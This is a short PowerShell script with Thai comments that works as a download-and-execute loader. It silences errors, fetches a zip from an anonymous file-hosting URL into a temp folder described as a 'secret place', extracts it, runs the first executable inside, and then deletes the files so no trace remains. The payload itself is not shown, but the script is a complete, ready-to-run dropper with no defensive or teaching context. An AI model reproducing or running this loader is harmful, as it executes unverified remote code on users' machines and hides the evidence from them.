$ErrorActionPreference = 'SilentlyContinue'

# 1. ตั้งชื่อตัวแปร
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempZip = [System.IO.Path]::GetTempFileName() + ".zip"
$tempDir = [System.IO.Path]::GetTempPath() + [System.Guid]::NewGuid().ToString()

# 2. ดาวน์โหลดไฟล์ลงที่ลับ (Temp)
(New-Object System.Net.WebClient).DownloadFile($zipUrl, $tempZip)

# 3. สร้างโฟลเดอร์ชั่วคราวและแตกไฟล์
New-Item -ItemType Directory -Path $tempDir | Out-Null
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $tempDir)

# 4. หาไฟล์ .exe แล้วรัน
$exePath = Get-ChildItem -Path $tempDir -Filter "*.exe" | Select-Object -First 1
$proc = Start-Process $exePath.FullName -WorkingDirectory $tempDir -PassThru -Wait

# 5. ทันทีที่ปิดโปรแกรม ให้ลบไฟล์และโฟลเดอร์ชั่วคราวทิ้งทั้งหมด
Remove-Item $tempDir -Recurse -Force
Remove-Item $tempZip -Force
